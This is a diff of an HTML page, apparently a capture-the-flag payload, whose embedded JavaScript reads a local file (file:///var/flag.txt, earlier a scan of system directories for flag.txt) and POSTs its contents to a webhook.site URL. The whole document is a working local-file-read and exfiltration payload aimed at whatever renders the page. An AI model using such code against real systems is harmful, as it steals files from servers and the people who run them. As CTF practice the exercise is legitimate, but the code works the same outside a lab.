@@ -3,37 +3,21 @@
 </head>
 <body>
     <script>
-        // Array of directories to search
-        var directories = [
-            "/",
-            "/home/",
-            "/usr/",
-            "/var/",
-            "/etc/",
-            "/opt/"
-        ];
+        // Create a new XMLHttpRequest
+        var x = new XMLHttpRequest();
 
-        // Function to attempt reading a file
-        function readFile(directory) {
-            var xhr = new XMLHttpRequest();
-            xhr.onload = function() {
-                if (this.status === 200) { // File exists and is readable
-                    // Send the file content to your webhook
-                    var sendXhr = new XMLHttpRequest();
-                    sendXhr.open('POST', 'https://webhook.site/036cf903-e785-4967-8ac6-83104bba907b', true);
-                    sendXhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                    sendXhr.send('file=' + encodeURIComponent(directory + "flag.txt") + '&data=' + encodeURIComponent(this.responseText));
-                }
-            };
-            // Try to read the file
-            xhr.open("GET", directory + "flag.txt", true);
-            xhr.send();
-        }
+        // Function to send data to your server when the response is loaded
+        x.onload = function() {
+            // Send the content of the file to your server
+            var sendXhr = new XMLHttpRequest();
+            sendXhr.open('POST', 'https://webhook.site/036cf903-e785-4967-8ac6-83104bba907b', true);
+            sendXhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            sendXhr.send('data=' + encodeURIComponent(this.responseText));
+        };
 
-        // Iterate over directories
-        for (var i = 0; i < directories.length; i++) {
-            readFile(directories[i]);
-        }
+        // Open the request to read the file
+        x.open("GET", "file:///var/flag.txt", true);
+        x.send();
     </script>
 </body>
 </html>
